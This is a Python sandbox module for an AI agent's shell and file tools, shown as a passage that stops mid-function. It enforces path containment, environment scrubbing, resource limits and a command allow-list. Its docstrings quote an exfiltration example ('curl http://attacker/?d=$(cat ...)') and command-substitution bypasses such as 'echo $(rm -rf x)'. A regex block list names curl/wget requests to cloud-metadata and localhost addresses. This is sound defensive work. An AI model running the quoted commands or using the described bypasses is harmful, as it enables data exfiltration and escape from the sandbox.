"""sandbox — per-user 运行环境隔离（A 层：代码级 root/cwd 锁定）

所有 agent 文件/命令工具强制在 `SANDBOX_ROOT/{tenant}/{user}/workspace/` 内
执行，模型无法接触宿主文件系统（解决：思考/输出暴露服务器真实路径）。

- get_sandbox_dir() / workspace_dir()：由 contextvars（user/tenant）推导
- safe_join()：相对路径 clamp 到 workspace，拒绝 ../ 与绝对路径逃逸
"""

from __future__ import annotations

import logging
import os
import re
import shlex
import sys
import time
from pathlib import Path
from typing import Any

logger = logging.getLogger(__name__)

#: 沙箱根环境变量名（多副本部署必须指向共享卷；启动校验见 app.main.verify_sandbox_root）
SANDBOX_ROOT_ENV = "SANDBOX_ROOT"

#: Windows 下用 cmd /c 包裹执行前，拦截参数中的 shell 元字符
#: （这些字符经 shlex.split 保留后传给 cmd /c 会被解释为 shell 语法，绕过白名单）
_SHELL_META = re.compile(r"[|&;`$()<>#\n]")


def sandbox_root() -> Path:
    """沙箱根：默认置于进程 cwd 上两级（项目外），避免 workspace 路径
    泄露服务器项目结构（S 安全修复：cwd 泄露项目/python-engine 前缀）。

    注意：默认值是**进程本地路径**，仅适用于单机开发。多副本部署必须显式设置
    SANDBOX_ROOT 指向共享卷（NFS/PVC），否则同一用户的任务落到不同副本时
    看不到彼此写入的文件（agent 文件工作流"间歇性失忆"）。
    """
    env = os.environ.get(SANDBOX_ROOT_ENV)
    if env:
        return Path(env).resolve()
    # 无论 cwd 是项目根还是子目录（python-engine），上两级都到项目外
    return Path(os.getcwd()).resolve().parent.parent / "chiron-sandbox"


def get_sandbox_dir() -> Path:
    """当前 user 的沙箱根（由 context 推导，自动创建）。"""
    from app.tools.context import get_tenant_id, get_user_id

    tenant = get_tenant_id() or "default"
    user = get_user_id() or "anonymous"
    d = sandbox_root() / tenant / user
    try:
        d.mkdir(parents=True, exist_ok=True)
    except OSError as e:
        logger.warning("sandbox dir create failed: %s", e)
    return d


def project_root() -> Path | None:
    """当前会话绑定的项目根（= 用户选中的真实项目目录）。

    来源是 ``app/tools/context.py`` 的会话级上下文键 ``project_root``，由上层
    （Go 网关 / 回合启动）注入。**未设置或不可用时返回 ``None``**，调用方回退到
    沙箱 workspace —— 回退是刻意的：宁可让 agent 在沙箱里工作，也不要因为一个
    坏路径让所有工具直接报错。

    只接受**绝对路径且确实存在的目录**。相对路径会被解析成进程 cwd 下的子目录，
    那是"看起来能用其实指错地方"的典型故障，因此一律拒绝。
    """
    from app.tools.context import get_tool_context

    raw = get_tool_context("project_root")
    if not raw:
        return None
    try:
        candidate = Path(str(raw))
        if not candidate.is_absolute() or not candidate.is_dir():
            return None
        return candidate.resolve()
    except OSError:
        return None


def workspace_dir() -> Path:
    """agent 文件操作的唯一根目录。

    优先返回会话项目根（D6 单仓库模式）；没有项目根时回退到沙箱 workspace。
    ``safe_join`` / ``git_tools`` / ``run_code`` 等都以此为边界，因此这一处切换
    就决定了"agent 改的是用户的项目，还是沙箱里的副本"。
    """
    root = project_root()
    if root is not None:
        return root
    d = get_sandbox_dir() / "workspace"
    try:
        d.mkdir(parents=True, exist_ok=True)
    except OSError as e:
        logger.warning("workspace dir create failed: %s", e)
    return d


def _sandbox_tmp_dir() -> Path:
    """沙箱子进程的 `TEMP`/`TMP`。

    **必须位于 workspace 之内**：`low_il` 子进程受 Windows no-write-up 约束，
    写不了 Medium 目录，而 `get_sandbox_dir()`（workspace 的父层）仍是 Medium ——
    实测在该目录建文件直接 `PermissionError(13)`。给 workspace 打 Low 标签的是
    `isolation._ensure_workspace_low_label()`，它只作用于 workspace 本身。

    git / ffmpeg / python 都会往 TEMP 写临时文件；TEMP 不可写会表现为"命令能启动、
    一写临时文件就失败"，报错离真正原因很远。
    """
    # **不能**用 ``workspace_dir() / ".tmp"``：切换项目根之后那会在**用户的仓库里**
    # 建一个 .tmp 目录 —— 既污染 git 状态，也可能被检查点当成未跟踪文件收进去。
    # 临时目录始终留在沙箱侧，与"agent 在哪里改代码"无关。
    d = get_sandbox_dir() / "workspace" / ".tmp"
    try:
        d.mkdir(parents=True, exist_ok=True)
    except OSError as e:  # noqa: BLE001 — 建不出来时退回 workspace 根，不阻断执行
        logger.warning("sandbox tmp dir create failed: %s", e)
        return workspace_dir()
    return d


def safe_join(rel: str) -> Path:
    """把路径解析到 workspace 内，拒绝逃逸。

    **语义是"必须在 workspace 之内"，不是"必须是相对路径"。** 早先这里一律拒绝
    Windows 驱动器前缀，于是模型/用户拿到工作区根之后传**根内的绝对路径**
    （`D:\\proj\\src\\a.py`）会被判成 `path escapes sandbox` —— 明明在圈内却报逃逸，
    表现就是"grep/read 工具被沙箱莫名拦住"，而文件其实完全可读。判据应当是
    **包含关系**（与 Reasonix 的 `within()` 同一个口径：`filepath.Rel` 后看有没有
    `..` 前缀），而不是路径的书写形态。

    绝对路径（驱动器前缀 / UNC）先按绝对路径解析，落在 base 内则放行，否则拒绝；
    相对路径仍走原来的 clamp。

    跨平台细节：`C:/Windows/win.ini` 在 **Linux** 上 `Path` 不认它是绝对路径
    （`C:` 不是驱动器），所以这里**显式**按驱动器形态判定并直接拒绝 —— 否则
    `(base / rel)` 会把它拼成一个无害但语义错的内层子目录，等于"看着拦了其实没拦"。
    这条也保证 Linux CI 上 `test_safe_join_rejects_escape` 与 Windows 行为一致。
    """
    base = workspace_dir().resolve()
    raw = str(rel or "")
    if re.match(r"^[A-Za-z]:[\\/]", raw) or raw.startswith(("\\\\", "//")):
        candidate = Path(raw)
        if not candidate.is_absolute():
            # Linux 上认不出的驱动器/UNC 形态：当作"圈外绝对路径"拒绝
            raise ValueError(f"path escapes sandbox: {rel}")
        target = candidate.resolve()
        raise_if_outside(base, target, rel)
        return target
    target = (base / raw).resolve()
    raise_if_outside(base, target, rel)
    return target


def raise_if_outside(base: Path, target: Path, shown: str) -> None:
    """包含关系判定：`target` 必须落在 `base` 之内，否则拒绝。

    用 `os.path.normcase` 折掉大小写/分隔符差异：Windows 上 `d:\\proj` 与 `D:\\proj`
    指向同一个目录，而纯字符串 `startswith` 会把它们判成两个 —— 于是"工作区根自己"
    也算逃逸。这正是"工具被沙箱莫名拦住"的第二个来源（第一个是拒绝绝对路径）。

    `os.path.commonpath` 而不是 `startswith(base)`：后者会把 `/work-evil` 当成
    `/work` 的子目录（Reasonix 的 `within()` 注释里点名过同一个坑）。
    """
    base_s = os.path.normcase(str(base))
    target_s = os.path.normcase(str(target))
    if base_s == target_s:
        return
    try:
        if os.path.commonpath([base_s, target_s]) == base_s:
            return
    except ValueError:
        # 不同驱动器 / 不同盘符前缀 ⇒ 必然在圈外
        pass
    raise ValueError(f"path escapes sandbox: {shown}")


def sandboxed_env() -> dict[str, str]:
    """执行环境：清理敏感/宿主变量，仅保留基础 PATH，并把用户目录变量
    重定向到沙箱内，防止 `$HOME`/`~` 泄漏宿主路径（S 安全修复）。

    注意：PYTHONPATH 和 PYTHONHOME 被显式排除（不在 allow 集合中），
    防止沙箱子进程通过 import 加载宿主模块。
    """
    allow = {
        "PATH",
        "SYSTEMROOT",
        "WINDIR",
        "COMSPEC",
        "TEMP",
        "TMP",
        "HOME",
        "USERPROFILE",
    }
    env = {k: v for k, v in os.environ.items() if k in allow}
    # 显式清除 PYTHONPATH/PYTHONHOME，防止沙箱子进程加载宿主模块
    env.pop("PYTHONPATH", None)
    env.pop("PYTHONHOME", None)
    env.pop("PYTHONSTARTUP", None)
    env["HOME"] = str(workspace_dir())
    env["USERPROFILE"] = str(workspace_dir())
    # TEMP/TMP 必须落在 **workspace 内部**，不能用 `get_sandbox_dir()`。
    #
    # Windows 的完整性检查是 no-write-up：`low_il` 子进程写不了 Medium 目录。
    # `_ensure_workspace_low_label()` 只给 workspace 本身打 Low 标签，它的**父层**
    # （`get_sandbox_dir()`）仍是 Medium —— 实测 low_il 子进程在该目录建文件直接
    # PermissionError(13)。而 git / ffmpeg / python 都会往 TEMP 写临时文件，
    # 于是"命令能启动、一写临时文件就失败"，报错还离真正原因很远。
    env["TEMP"] = str(_sandbox_tmp_dir())
    env["TMP"] = str(_sandbox_tmp_dir())
    # 沙箱子进程只跑模型代码（`run_code` 的 worker / 插件命令 / 钩子命令），**不需要**工具
    # 注册表 ⇒ 短路 `app/tools/__init__.py` 的 35 个 eager import。否则以
    # `python -m app.tools._sandbox_worker` 启动时会先把整条引擎依赖链拉进这个被清空的
    # env（其中 `logfire` 在 import 期调 `Path.home()`，缺 HOME 即 RuntimeError）。
    env["CHIRON_TOOLS_SKIP_REGISTRY"] = "1"
    return env


# ── 隔离档位：把命令变成真正会降级的 argv ──────────────────────────


def isolation_exec_argv(command: list[str]) -> list[str]:
    """按**当前生效的隔离档位**包装命令，使其真正按该档执行。

    这是 `shell_exec` / `persistent_shell` / 后台命令 / `git_*` / ffmpeg 共用的
    入口。为什么必须有这一层：Windows 的完整性级别只能改**当前进程**的令牌，
    且没有撤销 API —— 父进程一旦调用，被降级的是引擎自己。所以降级只能发生在
    真正执行命令的子进程里，父进程负责把它请起来并带上档位。

    此前各工具都是直接把命令交给 `create_subprocess_exec`，而父侧唯一的档位判据
    （`wrap_async_process`）只判 `rank < Level.JOB`，于是 `job` / `low_il` /
    `appcontainer` 三档的执行措施完全相同：切档位只是改了个显示值。实测已确认
    `low_il` 包装后子进程完整性从 Medium(0x2000) 降到 Low(0x1000)。

    异常**不外理**：调用方拿到异常应拒绝执行（fail-closed），不能退回无隔离路径。
    """
    from app.isolation import child_launch_argv, resolve_level

    return child_launch_argv(resolve_level(), command)


# 被禁止的 shell 逃逸模式（S 安全修复：cwd 锁定无法阻止命令内绝对路径访问宿主）
# 注意：生产部署为 Linux/alpine（见 Dockerfile），必须覆盖 Unix 绝对路径。
_ESCAPE_PATTERNS = [
    r"[A-Za-z]:[\\/]",  # Windows 盘符绝对路径 (C:\ 或 C:/)
    r"\\\\",  # UNC 路径
    r"(^|[^A-Za-z0-9_.])(\.\.)[\\/]",  # 父目录跳转 ..\ 或 ../
    r"\bcd\b[^&|;]*[A-Za-z]:[\\/]",  # cd 到绝对路径
    # Unix/Linux 逃逸：绝对路径（/xxx，2+ 字符路径段或单独 /）、~ 家目录、$HOME 变量。
    # 以空格/引号/分号开头界定，避免误伤相对路径（a/b）、URL（http://）
    # 与 Windows cmd 单字符开关（/b /d /s）。
    r"(?:^|[\s\"';])(?:/(?:[A-Za-z0-9_.-]{2,}|$)|~/?|\$\{?HOME\}?\b)",
    # 云元数据 / 内网地址（curl/wget 等 SSRF 常见目标）
    r"(?:^|[\s\"';])(?:curl|wget)\s+https?://(?:169\.254\.169\.254|127\.0\.0\.1|localhost)",
    # 命令替换：`_iter_executables` 只取每段**首个**可执行名，故 `echo $(rm -rf x)`
    # 的首词是 echo、能穿过白名单，而 shell 会真正执行 $() 内的命令。
    r"\$\(",
    r"`",
    # 换行：`_split_segments` 只按 `|` / `;` / `&&` / `||` 分段，**不按换行**，故
    # `echo ok\nrm -rf x` 会被当成一条命令、首词仍是 echo。
    r"[\r\n]",
]

# 允许在沙箱内执行的命令白名单（仅允许安全的 Python/数据操作命令）
_ALLOWED_EXECUTABLES: set[str] = {
    # Python 解释器
    "python",
    "python3",
    # Git 版本控制（经 _ensure_sandbox_repo 校验，不会穿透宿主仓库）
    "git",
    # 安全的基础命令
    "echo",
    "ls",
    "dir",
    "cat",
    "type",
    "head",
    "tail",
    "wc",
    "find",
    "grep",
    "sort",
    "uniq",
    "cut",
    "tr",
    "tee",
}

#: shell **内建**命令：没有独立可执行文件，因此不在 `_ALLOWED_EXECUTABLES` 里，
#: 但持久 shell 的既有用法依赖它们（`cd` 切目录、`exit` 设置退出码、`export` 环境变量…）。
#: S5-1 的教训：直接套用 shell_exec 的白名单会把这些能力一起砍掉（实测打挂 3 个既有测试）。
_SHELL_BUILTINS: frozenset[str] = frozenset(
    {
        "cd",
        "exit",
        "export",
        "unset",
        "set",
        "pwd",
        "alias",
        "unalias",
        "source",
        ".",
        "true",
        "false",
        "test",
        "read",
        "shift",
        "return",
        "wait",
    }
)

#: 命令**文本**准入用的白名单（`check_command_text` 专用）= 可执行白名单 ∪ shell 内建。
_TEXT_ALLOWED: frozenset[str] = frozenset(_ALLOWED_EXECUTABLES) | _SHELL_BUILTINS


def _normalize_exe(name: str) -> str:
    """规范化可执行文件名：取 basename，去平台后缀，小写。"""
    name = Path(name).name.lower()
    for suffix in (".exe", ".cmd", ".bat", ".com"):
        if name.endswith(suffix):
            name = name[: -len(suffix)]
            break
    return name


def _parse_command(command: str) -> tuple[list[str], str | None]:
    """将命令字符串解析为 [executable, *args]，校验白名单。

    返回 (args, error_reason)。error_reason 非 None 表示被拒绝。
    """
    command = command.strip()
    if not command:
        return [], "empty command"

    try:
        parts = shlex.split(command)
    except ValueError as e:
        return [], f"invalid command syntax: {e}"

    if not parts:
        return [], "empty command"

    exe_name = _normalize_exe(parts[0])

    # 白名单校验（python/python3 已在 _ALLOWED_EXECUTABLES 中，
    # sys.executable 完整路径由 _normalize_exe 规范化后统一走白名单校验）
    if exe_name not in _ALLOWED_EXECUTABLES:
        return [], f"executable not allowed: {exe_name}"

    return parts, None


#: CPython 里"开关 + 独立的值 token"形态：漏判会把它的值误认成脚本名
_PYTHON_VALUE_OPTS = frozenset({"-X", "-W", "--check-hash-based-pycs"})


def _python_code_operand(args: list[str]) -> tuple[str, str | None]:
    """按 CPython 的参数形态判断"要交给解释器执行的代码从哪来"。

    返回 ``("inline", 代码体)`` / ``("script", 脚本路径)`` / ``("module", 模块名)`` /
    ``("stdin", None)`` / ``("none", None)``。

    三条口径决定静态守卫会不会被绕过：
      * 紧贴与组合开关**等价** —— 实测 ``-cimport os``、``-Bc "import os"``、
        ``-mjson.tool`` 都能跑，只匹配独立的 ``-c`` token 会整段跳过守卫；
      * 只有**第一个**非选项参数才是脚本：``-c`` / ``-m`` 之后的一切是 ``sys.argv``，
        所以 ``python parse.py -c x`` 里那个 ``-c`` 是脚本自己的参数，不能误判成内联代码；
      * 带值开关（``-X`` / ``-W``）要连值一起跳过。
    """
    index = 0
    while index < len(args):
        arg = args[index]
        index += 1

        if arg == "--":
            for item in args[index:]:
                if not item.startswith("-"):
                    return "script", item
            return "none", None
        if arg == "-":
            return "stdin", None
        if not arg.startswith("-"):
            return "script", arg
        if arg.startswith("--"):
            # 长开关只认 `--opt=value` 形态，值不可能是脚本
            if arg in _PYTHON_VALUE_OPTS:
                index += 1
            continue
        if arg in _PYTHON_VALUE_OPTS:
            index += 1  # 跳过它的值，别把 `importtime` 当成脚本
            continue

        flags = arg.lstrip("-")
        if not flags:
            continue
        # 短开关可组合（-Bc、-OO）：从左往右第一个 c/m 就是代码/模块开关，
        # 它后面紧贴的一切是值，值空则取下一个 token
        for pos, ch in enumerate(flags):
            if ch not in "cm":
                continue
            attached = flags[pos + 1 :]
            if attached:
                value = attached
            elif index < len(args):
                value = args[index]
                index += 1
            else:
                value = ""
            return ("inline" if ch == "c" else "module"), value or None
    return "none", None


#: 脚本内容检查的体积上限：超过就**拦下**（"读不动"不等于"不用查"）。
_SCRIPT_INSPECT_MAX_BYTES = 1024 * 1024


async def _read_workspace_script(name: str) -> tuple[str | None, str | None]:
    """读出 workspace 内脚本的文本，供 `check_static` 使用；返回 (内容, 拒绝原因)。

    读不到一律拦下（fail-closed）：静态层唯一的绕过方式就是"让它别看这份代码"，
    而脚本文件执行正是此前完全没有被检查的那条路（`python 脚本.py` 的内容零检查，
    逃逸正则只看命令文本）。路径同样过 `safe_join`，越界即拒。
    """
    import asyncio

    def _read() -> tuple[str | None, str | None]:
        try:
            path = safe_join(name)
        except ValueError as exc:
            return None, f"script path rejected: {exc}"
        if not path.is_file():
            return None, f"script not found in workspace: {name}"
        size = path.stat().st_size
        if size > _SCRIPT_INSPECT_MAX_BYTES:
            return None, f"script too large to inspect ({size} bytes)"
        try:
            return path.read_text(encoding="utf-8"), None
        except (UnicodeDecodeError, OSError) as exc:
            return None, f"script not readable as utf-8 source: {exc}"

    return await asyncio.to_thread(_read)


def _has_escape(command: str) -> str | None:
    """检测命令是否含逃逸模式，命中返回原因。"""
    import re

    for pat in _ESCAPE_PATTERNS:
        m = re.search(pat, command)
        if m:
            return pat
    return None


def _split_segments(command: str) -> list[str]:
    """按**未加引号**的分隔符（`|` / `;` / `&&` / `||`）切分命令文本。

    必须尊重引号：`python -c "import time; time.sleep(1)"` 里的 `;` 属于参数而不是
    命令分隔符。朴素正则会误切，进而把 `time.sleep(1)"` 当成可执行名而拒绝 —— 这正是
    S5-1 实现时踩到的坑（实测打挂 3 个既有 persistent_shell 测试）。
    """
    segments: list[str] = []
    buf: list[str] = []
    quote = ""
    index = 0
    while index < len(command):
        char = command[index]
        if quote:
            buf.append(char)
            if char == quote:
                quote = ""
            index += 1
            continue
        if char in ("'", '"'):
            quote = char
            buf.append(char)
            index += 1
            continue
        if char in "|;":
            segments.append("".join(buf))
            buf = []
            # `||` / `&&` 是双字符分隔符，一起跳过
            index += 2 if (index + 1 < len(command) and command[index + 1] == char) else 1
            continue
        if char == "&" and index + 1 < len(command) and command[index + 1] == "&":
            segments.append("".join(buf))
            buf = []
            index += 2
            continue
        buf.append(char)
        index += 1
    segments.append("".join(buf))
    return segments


def _iter_executables(command: str) -> list[str]:
    """从命令文本中提取每个子命令的首个可执行名（按未加引号的分隔符分段）。

    语法不完整的分段直接跳过 —— 语法错误由调用方的解析负责报错，这里只做准入判断。
    """
    names: list[str] = []
    for segment in _split_segments(command):
        segment = segment.strip()
        if not segment:
            continue
        try:
            parts = shlex.split(segment)
        except ValueError:
            continue
        if parts:
            names.append(_normalize_exe(parts[0]))
    return names


def check_command_text(command: str) -> str | None:
    """命令**文本**准入检查，供"命令交给 shell 执行"的入口复用（persistent shell）。

    与 :func:`run_in_sandbox` 的 `_parse_command` **同源**（逃逸拦截 + 可执行名白名单），
    区别是**不把命令拆成 argv**：持久 shell 需要保留管道/重定向语义，因此按
    `|` / `;` / `&&` / `||` 分段后逐段校验首个可执行名。

    S5-1/S5-2：此前 persistent shell 只做逃逸拦截、**没有白名单校验**，于是
    `persistent_shell("rm -rf ...")` 与 `shell_exec` 的判定不一致。

    Returns:
        拒绝原因；`None` 表示放行。
    """
    escape = _has_escape(command)
    if escape:
        return f"escape pattern blocked: {escape}"
    executables = _iter_executables(command)
    if not executables:
        return "empty command"
    for exe in executables:
        if exe not in _TEXT_ALLOWED:
            return f"executable not allowed: {exe}"
    return None


async def check_shell_command(command: str) -> str | None:
    """**交给 shell 执行**的命令的完整准入检查（后台命令 `tool_job` 用这一份）。

    为什么需要它：`tool_job`（`run_in_background`）此前只调 :func:`_has_escape` ——
    没有白名单、没有资源限制，也没有 python 代码静态检查。它和 `shell_exec` 跑的是
    同一个沙箱、同一个 workspace，却只有最弱的那一层防护，于是：

    * `run_in_background("curl http://attacker/?d=$(cat ...)")` 里的 curl 白名单挡不住
      （因为根本没查白名单）；
    * `run_in_background("python -c 'import os; os.system(...)'")` 完全绕过 code_guard，
      而 `shell_exec` 走同一段代码会被拦。

    这里把三层合成一个入口：文本白名单（含逃逸拦截）+ 逐段 python 代码静态检查
    （内联 `-c` / 工作区脚本 `脚本.py`，与 `_run_in_sandbox_impl` 同一套口径）。

    Returns:
        拒绝原因；`None` 表示放行。
    """
    reason = check_command_text(command)
    if reason:
        return reason

    from app.tools.code_guard import check_static

    for segment in _split_segments(command):
        segment = segment.strip()
        if not segment:
            continue
        try:
            parts = shlex.split(segment)
        except ValueError:
            continue
        if not parts or _normalize_exe(parts[0]) not in ("python", "python3"):
            continue
        kind, operand = _python_code_operand(parts[1:])
        if kind == "stdin":
            return "python reads code from stdin, which the sandbox cannot inspect"
        code: str | None = None
        if kind == "inline":
            code = operand
        elif kind == "script":
            if not operand:
                return "python missing script operand"
            code, read_reason = await _read_workspace_script(operand)
            if code is None:
                return f"{read_reason}"
        if code:
            blocked = check_static(code)
            if blocked:
                return f"python code rejected — {blocked}"
    return None


# ── 统一的资源限制（S5-2：三个执行入口共用，避免各写一套常量后漂移）──

#: 子进程内存上限（RLIMIT_AS）
MEM_LIMIT_BYTES = 512 * 1024 * 1024
#: 子进程 CPU 时间上限（RLIMIT_CPU，秒）
CPU_LIMIT_SECONDS = 30
#: 子进程单文件写入上限（RLIMIT_FSIZE）
FILE_LIMIT_BYTES = 10 * 1024 * 1024

# ── 执行输出的可信截断（批 B 片 5）──
#
# 对位 deepagents 的 `ExecuteOffloadResult`：**截断与退出码分开表达**。此前执行输出要么
# 不截断（把整段塞进上下文），要么在工具层静默砍掉 —— 后者会让模型误判"输出就这么短"。
#: 单次执行输出的字节上限
MAX_EXECUTE_OUTPUT_BYTES = 512 * 1024
#: 截断时保留的 head / tail 字节（中间省略并**显式标注**省略量）
EXECUTE_HEAD_BYTES = 8 * 1024
EXECUTE_TAIL_BYTES = 2 * 1024

#: 超限输出的落盘目录（相对 workspace）。
#
# 为什么必须落盘：只给 head+tail 时，被省掉的中段**没有任何通道能再取回** ——
# 而编译/测试的第一条真实错误恰好常在中段。模型看到「省略 400KB」后只能重跑命令，
# 于是同一道命令反复烧轮数，外表现就是"执行失败后不能自愈"。
# 落盘 + 返回 `log_path` 之后，模型可以用 `read_file(offset)` 或 `grep_files` 取任意一段。
EXEC_OFFLOAD_DIR = ".chiron/exec"

#: 落盘日志的保留份数：长任务会跑几百条命令，不修剪会撑满磁盘
EXEC_OFFLOAD_KEEP = 40


def truncate_execute_output(text: str) -> tuple[str, bool]:
    """按字节上限截断执行输出，保留 head+tail 并标注省略量。

    Returns:
        `(截断后的文本, 是否发生截断)`。调用方据此填 `truncated` 字段 ——
        **截断由产生截断的这一层给出**，不由上层扫文本猜测（协议约束 2）。
    """
    encoded = text.encode("utf-8", errors="replace")
    if len(encoded) <= MAX_EXECUTE_OUTPUT_BYTES:
        return text, False
    head = encoded[:EXECUTE_HEAD_BYTES].decode("utf-8", errors="replace")
    tail = encoded[-EXECUTE_TAIL_BYTES:].decode("utf-8", errors="replace")
    omitted = len(encoded) - EXECUTE_HEAD_BYTES - EXECUTE_TAIL_BYTES
    return f"{head}\n... [{omitted} bytes truncated] ...\n{tail}", True


def _exec_offload_dir() -> Path:
    folder = workspace_dir() / EXEC_OFFLOAD_DIR
    folder.mkdir(parents=True, exist_ok=True)
    return folder


def _prune_exec_logs(folder: Path) -> None:
    """只留最近 `EXEC_OFFLOAD_KEEP` 份：长任务会跑掉几百条命令，不修剪会撑满磁盘。

    修剪失败一律忽略：日志留多一份是无害的，把执行结果搞丢才是有害的。
    """
    try:
        logs = sorted(
            folder.glob("*.log"), key=lambda p: p.stat().st_mtime, reverse=True
        )
    except OSError:
        return
    for stale in logs[EXEC_OFFLOAD_KEEP:]:
        try:
            stale.unlink()
        except OSError:
            pass


def offload_execute_output(
    text: str, kind: str
) -> tuple[str, bool, str | None]:
    """超限时把**完整**输出落盘，并把"去哪取中段"写进返回文本。

    与 `truncate_execute_output` 的区别只有一个：省略掉的中段**还能取回来**。
    路径是相对 workspace 的，所以模型能直接 `read_file` / `grep_files` 它 ——
    给绝对路径反而会被 `safe_join` 拒绝，等于没给。

    Returns:
        `(呈现给模型的文本, 是否截断, 日志相对路径或 None)`。
    """
    encoded = text.encode("utf-8", errors="replace")
    if len(encoded) <= MAX_EXECUTE_OUTPUT_BYTES:
        return text, False, None

    rel: str | None = None
    try:
        folder = _exec_offload_dir()
        stamp = time.strftime("%Y%m%d-%H%M%S")
        # 同一秒内可能连跑两条命令：加 pid 与序号避免覆盖
        name = f"exec-{stamp}-{os.getpid()}-{kind}.log"
        target = folder / name
        counter = 1
        while target.exists():
            target = folder / f"exec-{stamp}-{os.getpid()}-{kind}-{counter}.log"
            counter += 1
        target.write_bytes(encoded)
        _prune_exec_logs(folder)
        rel = f"{EXEC_OFFLOAD_DIR}/{target.name}"
    except Exception as exc:  # noqa: BLE001 — 落盘失败不能连累执行结果
        logger.warning("exec offload failed (%s); falling back to head+tail only", exc)

    head = encoded[:EXECUTE_HEAD_BYTES].decode("utf-8", errors="replace")
    tail = encoded[-EXECUTE_TAIL_BYTES:].decode("utf-8", errors="replace")
    omitted = len(encoded) - EXECUTE_HEAD_BYTES - EXECUTE_TAIL_BYTES
    if rel is None:
        return f"{head}\n... [{omitted} bytes truncated] ...\n{tail}", True, None
    # 提示必须写成**可执行**的：模型要知道用哪个工具、传什么参数。只说"已保存"
    # 等于让它猜，而猜错一次就是一轮预算。
    notice = (
        f"\n... [{omitted} bytes truncated of {len(encoded)} total; FULL output saved at "
        f"{rel} — read the middle with read_file(path=\"{rel}\", offset=N) or narrow it "
        f"with grep_files(query, root=\"{EXEC_OFFLOAD_DIR}\")] ...\n"
    )
    return f"{head}{notice}{tail}", True, rel


def _attach_log_paths(
    payload: dict[str, Any], stdout_log: str | None, stderr_log: str | None
) -> None:
    """把落盘路径挂到执行结果上（没落盘就不加字段）。

    单独成字段而不是只写在文本里：前端与上层据此能直接给出"查看完整日志"的入口，
    不必去正则解析刚才那段提示文字。
    """
    if stdout_log:
        payload["stdout_log"] = stdout_log
    if stderr_log:
        payload["stderr_log"] = stderr_log
    if stdout_log or stderr_log:
        # 长任务里日志会越攒越多；让模型知道这里可以清理，而不是默认它永不爆。
        payload["log_note"] = (
            f"full output under {EXEC_OFFLOAD_DIR}/ (keeps the latest "
            f"{EXEC_OFFLOAD_KEEP} files)"
        )


def apply_resource_limits() -> None:
    """施加 POSIX 资源限制（fork 后立即调用）。

    非 POSIX 平台（Windows 无 `resource` 模块）**静默跳过**，由父进程的 wall-clock
    超时兜底 —— 与 `app/plugins/plugin_runner.py` 的既有降级语义一致。施加失败同样
    只降级不阻断（记录到 stderr）。
    """
    try:
        import resource  # POSIX only
    except ImportError:
        return
    try:
        resource.setrlimit(resource.RLIMIT_AS, (MEM_LIMIT_BYTES, MEM_LIMIT_BYTES))
        resource.setrlimit(resource.RLIMIT_CPU, (CPU_LIMIT_SECONDS, CPU_LIMIT_SECONDS))
        resource.setrlimit(resource.RLIMIT_FSIZE, (FILE_LIMIT_BYTES, FILE_LIMIT_BYTES))
    except (ValueError, OSError) as exc:  # pragma: no cover - 平台相关
        sys.stderr.write(f"[sandbox] setrlimit failed (relaxed): {exc}\n")


def _rlimit_kwargs() -> dict[str, Any]:
    """asyncio 子进程的 rlimit 参数（仅 POSIX 带 `preexec_fn`）。

    说明：`preexec_fn` 在**多线程**进程中由官方标注为不安全（fork 后只应做
    async-signal-safe 的事）。这里只调用 `setrlimit` 系统调用，且仓库既有做法一致
    （`app/plugins/plugin_runner.py:41-54`）；Windows 无 resource 模块，返回空。
    """
    if sys.platform == "win32":
        return {}
    return {"preexec_fn": apply_resource_limits}


async def run_in_sandbox(command: str, timeout: int = 120) -> dict[str, Any]:
    """在沙箱内执行命令，并**审计每一次出口**（S5-3）。

    审计刻意放在这一层而不是实现内部：`_run_in_sandbox_impl` 有 5 个提前 return
    （逃逸 / 白名单 / git 限制 / Windows 元字符 / 超时），逐个插桩必然漏；包一层则
    **所有出口都被记一次**，且"被拦下"与"执行失败"能区分开。
    """
    import time

    from app.tools.exec_audit import (
        OUTCOME_BLOCKED,
        OUTCOME_ERROR,
        OUTCOME_OK,
        OUTCOME_TIMEOUT,
        record_execution,
    )

    started = time.monotonic()
    result = await _run_in_sandbox_impl(command, timeout)

    blocked = bool(result.get("reason")) or str(result.get("error", "")).startswith(
        "command blocked"
    )
    if result.get("error") == "timeout":
        outcome = OUTCOME_TIMEOUT
    elif blocked:
        outcome = OUTCOME_BLOCKED
    elif "error" in result:
        outcome = OUTCOME_ERROR
    elif result.get("exit_code") == 0:
        outcome = OUTCOME_OK
    else:
        outcome = OUTCOME_ERROR

    raw_exit = result.get("exit_code")
    raw_reason = result.get("reason") or result.get("error")
    record_execution(
        tool="shell_exec",
        command=command,
        outcome=outcome,
        exit_code=raw_exit if isinstance(raw_exit, int) else None,
        reason=str(raw_reason)[:200] if raw_reason else None,
        duration_ms=int((time.monotonic() - started) * 1000),
    )
    return result


async def _run_in_sandbox_impl(command: str, timeout: int = 120) -> dict[str, Any]:
    """在沙箱 workspace 内执行命令（direct exec，不经过 shell），
    cwd 锁定 + 环境清理 + 逃逸拦截 + 命令白名单。

    使用 create_subprocess_exec 替代 create_subprocess_shell，
    彻底消除 shell 元字符注入（管道/重定向/变量展开/通配符等）。
    """
    import asyncio.subprocess

    # 第一层：正则逃逸拦截（绝对路径/父目录/SSRF）
    esc = _has_escape(command)
    if esc:
        return {
            "error": "command blocked: absolute-path / parent-directory access is not allowed in sandbox",
            "reason": esc,
        }

    # 第二层：解析命令 + 白名单校验
    args, reason = _parse_command(command)
    if reason:
        return {"error": f"command blocked: {reason}"}

    prog = args[0]
    rest = args[1:]

    # 第二层半：交给 python 解释器的**代码本身**做 AST 静态检查（复用 code_guard，
    # 与 run_code 工具同一套守卫）。逃逸正则与白名单都只看**命令文本**，而解释器内部
    # 执行的代码不受它们约束 —— python 在白名单里，于是"代码层"曾是绕过全部命令防护的
    # 直通车。按代码来源四条入口分别处置：
    #   * inline（`-c`，含紧贴/组合开关 `-cimport os`、`-Bc "import os"`）→ 查代码体；
    #   * script（`python <脚本.py>`）→ 读文件内容再查；此前脚本内容**完全不检查**，
    #     先用文件工具把代码写进 workspace 再执行就绕过了整层静态防护；
    #   * module（`-m`）→ 已安装模块源码不在 workspace，无从检查，仍只有命令层防护；
    #   * stdin（`python -`）→ 代码根本不出现在命令文本里，直接拒。
    # 静态检查不是完备隔离（可混淆绕过），但把能查的路都抬到与 run_code 一致的门槛。
    if _normalize_exe(prog) in ("python", "python3"):
        from app.tools.code_guard import check_static

        kind, operand = _python_code_operand(rest)
        if kind == "stdin":
            return {"error": "command blocked: python reads code from stdin, which the sandbox cannot inspect"}
        code: str | None = None
